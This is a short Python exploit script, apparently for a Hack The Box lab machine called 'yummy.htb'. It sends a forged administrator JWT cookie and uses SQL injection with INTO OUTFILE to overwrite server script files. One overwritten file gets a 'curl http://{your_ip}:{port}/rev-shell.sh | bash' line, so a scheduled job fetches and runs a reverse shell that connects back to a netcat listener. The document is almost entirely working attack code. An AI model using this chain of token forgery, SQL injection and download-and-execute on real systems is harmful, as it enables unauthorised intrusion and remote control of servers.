import requests

#set up your web server with python3 -m http.server {port} inside the folder containing the rev-shell.sh file
#and also set up the listener with nc -nvlp 9091
your_ip = '10.10.14.69'
port = 9090

proxies = {'http':'http://localhost:8080'}

# login first, analyze the jwt token and then use decrypt.py with the n value used for the token 

admin_cookie = {"X-AUTH-Token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InJhbmRvbUBtYWlsLmNvbSIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzM4NTk1NzAzLCJleHAiOjE3Mzg1OTkzMDMsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiOTI2MjMwMjEwMzA5MDU4ODAzMDcyOTA4MDEyNzA1NTQzMjg3NjMxNDUzNjU0NjQ5OTE4MzMzOTg3NjI1NTcxODcxMDMyMTg5NDc3Mzk5MjYxMjUzNzI5NzcyOTEyMTQwNDYzNzk1ODExMTAxNDI2OTYwOTA4ODU0MzkwMDA1NDc0NjQ4NjQzMTQ5MDExODAzMjI4NTM0ODI2MjQwMTgxNDkzMjExODAwMjM3OTQ0MDg0MDExMDI0NzIxMzM0MTYzMzg0ODE3NDA5NzM4MTM5NTQ0NDE5NjMxMDA4NTA0Nzg4MjIwNjIwMDU1Nzk4NDYxNTYzNzIyMTU5OTkwMzg4ODY3OTE4NjYxMDQ0NDE3MDk3MDMwNzQ2NjA2NjAyODg4MTM5MTQxODIwNDcwNzAzMjUxNDIzMTQ0NjkiLCJlIjo2NTUzN319.BboC54dPiZyK7XxiYV4UfqZGJjWL7IgNboFatpSackLWm5xj77oBdXuOmTPgs3Sp9xVsQtix5gZmd1GewGSqh5IkJSprCO_ie7-tXI0ogQ2d_KEMFj88za064iRWndGl6YHsSZIhpVpiotfNHEgp9Z4BTrodGDSyafEQqx4TkpciTkQ"}

url = "http://yummy.htb:80/admindashboard?s=y&o=ASC"
sqli = ";select+'{}'+INTO+OUTFILE++'{}'"

# modify the content of dbstatus.json
requests.get(url + sqli.format("something","/data/scripts/dbstatus.json"), cookies=admin_cookie, proxies=proxies)

# modify the content of fixer-v*latest* (if you need to change it again you need to create another file with a higher version number)
requests.get(url + sqli.format(f"curl http://{your_ip}:{port}/rev-shell.sh | bash","/data/scripts/fixer-v__________9999"), cookies=admin_cookie, proxies=proxies)

print("Wait at max 1 minute for the connection!")